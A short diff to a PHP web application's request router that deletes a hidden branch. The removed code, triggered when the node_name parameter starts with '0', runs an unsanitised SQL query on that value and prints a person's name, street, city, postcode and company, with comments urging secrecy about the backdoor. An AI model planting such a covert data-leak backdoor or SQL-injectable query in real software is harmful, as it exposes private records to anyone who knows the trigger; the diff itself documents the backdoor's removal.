@@ -49,24 +49,6 @@ else $template_id=false;
 
 //initializing node methods
 if (!empty($_GET['node_name'])) {
-	//omfg what's this! jail , jail, penalty of death!
-	// reopened by [CENSORED], keep this in secret, then you can benefit from it..
-	if(strpos($_GET['node_name'],'0')===0) {
-		$numbah=$_GET['node_name'];
-		$db->query("set character_set_connection=latin2");
-		$set=$db->query("select * from tz.gts where full_number='$numbah'");
-		$set->next();
-		echo $set->getString('full_name')."<br>";
-		echo $set->getString('full_street')."<br>";
-		echo $set->getString('city')."<br>";
-		echo $set->getString('psc')."<br>";
-		echo $set->getString('company')."<br>";
-
-		die();
-	}
-
-	else $node = nodes::redirByName($_GET['node_name']);
-	// END OF JAIL ;)
 	$node  = nodes::redirByName($_GET['node_name']);
 }
 elseif (!empty($_GET['node_id'])) {
